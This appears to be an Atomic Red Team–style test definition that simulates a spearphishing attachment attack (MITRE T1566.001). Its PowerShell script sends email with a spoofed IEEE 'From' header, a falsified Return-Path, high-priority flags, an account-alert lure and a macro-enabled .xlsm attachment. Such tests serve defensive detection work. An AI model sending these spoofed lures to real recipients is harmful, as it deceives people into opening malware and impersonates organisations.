attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed headers
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment by spoofing headers instead of the From field.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server to use
        type: string
        default: "localhost"  # Use localhost for testing (e.g., hMailServer or Postfix)
      smtp_port:
        description: SMTP port
        type: integer
        default: 25  # Standard SMTP port for hMailServer
      sender_visible_email:
        description: Email address to spoof in the "From" header
        type: string
        default: '"IEEE Notification" <chaymabouattour@ieee.org>'  # Spoofed email address
      reply_to_email:
        description: Reply-To email address
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
      recipient_email:
        description: Recipient email address
        type: string
        default: "victim2025@outlook.fr"  # Replace with the actual recipient's email address
      subject:
        description: Customized subject of the email
        type: string
        default: "Urgent: Please review the attached document"
      body:
        description: Customized body content of the email
        type: string
        default: |
          Dear User,<br>
          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
          Thank you for your cooperation.<br>
          Best regards,<br>
          The Security Team
      attachment_path:
        description: Path to the malicious attachment
        type: string
        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
      log_file:
        description: Path to the log file
        type: string
        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = #{smtp_port}
        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed address visible in the "From" field
        $replyToEmail = "#{reply_to_email}"  # Reply-To email address
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"

        # Create a MailMessage object
        $mailMessage = New-Object System.Net.Mail.MailMessage
        $mailMessage.From = New-Object System.Net.Mail.MailAddress("#{sender_visible_email}")  # Spoofed From address
        $mailMessage.To.Add($recipientEmail)
        $mailMessage.Subject = $subject
        $mailMessage.Body = $body
        $mailMessage.IsBodyHtml = $true

        # Add custom headers for spoofing
        $mailMessage.Headers.Add("Reply-To", $replyToEmail)
        $mailMessage.Headers.Add("Return-Path", "#{reply_to_email}")  # Falsified Return-Path
        $mailMessage.Headers.Add("X-Priority", "1")
        $mailMessage.Headers.Add("X-MSMail-Priority", "High")
        $mailMessage.Headers.Add("Importance", "High")

        # Add attachment
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "❌ Attachment file not found: $attachmentPath"
            exit 1
        }

        # Configure SMTP client
        $smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtpClient.EnableSsl = $false  # Disable SSL for local SMTP server

        # Send the email
        try {
            $smtpClient.Send($mailMessage)
            Write-Host "✅ Email sent successfully."
            
            # Log the result
            $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "❌ Error sending email: $_"
            exit 1
        } finally {
            if ($attachment -ne $null) {
                $attachment.Dispose()
            }
        }
